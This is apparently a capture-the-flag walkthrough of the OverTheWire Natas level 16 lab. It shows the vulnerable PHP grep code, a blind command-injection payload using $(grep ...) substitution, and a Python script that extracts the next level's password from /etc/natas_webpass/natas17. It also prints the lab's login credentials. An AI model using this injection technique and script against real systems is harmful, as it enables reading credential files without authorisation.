In level 11 they did not filter the "`''`" or "`""`", but this level they did:
```php
<?
ini_set('pcre.jit', 0);
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

This levels focuses on blind OS command injection.

I tested `$(sleep 5)` and it works so we can confirm that subshell works. Meaning that command substitution works.

For example if we input "apple" the command becomes `grep -i "apple" dictionary.txt` listing us the words from the dictionary.

However, if we input "appleA", there should be no result at all from the dictionary because no English word ends in a capitalized letter. "A" being theoretically the first char of the password. 

The scenario: 
![[Pasted image 20260714082810.png]]
We have a small list of words of dictionary and an example password string.

Let's try the command:
![[Pasted image 20260714082919.png]]

And one more command that will be or sub command:
![[Pasted image 20260714083223.png]]

Getting the first char correct returns the whole password string. so, we get:
![[Pasted image 20260714083412.png]]
Get one char wrong, and it returns nothing. Take this as the advantage to write our script:
```python
import httpx
import string
import base64

url = "http://natas16.natas.labs.overthewire.org"

b64_bytes = base64.b64encode("natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb".encode('utf-8'))
b64_string = b64_bytes.decode('utf-8')

headers = {
    "Authorization":f"Basic {b64_string}",
    "Content-Type":"application/x-www-form-urlencoded"
    }

PASS_LENGTH = 32
chars = string.digits + string.ascii_uppercase + string.ascii_lowercase
password = ""

while len(password) <= PASS_LENGTH:
    try:
        for i in range(0, len(chars)-1):
            payload = f"apple$(grep ^{password+chars[i]} /etc/natas_webpass/natas17)"
            uri = f"/?needle={payload}&submit=Search"

            response = httpx.get(url=url+uri, headers=headers)

            if "apple" not in response.text:
                password += chars[i]
                print(f"password:{password}")
                break

    except KeyboardInterrupt:
        print("Stopped")
        break

print(f"Done!\nThe password is:{password}")
```

lvl17 pass: KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx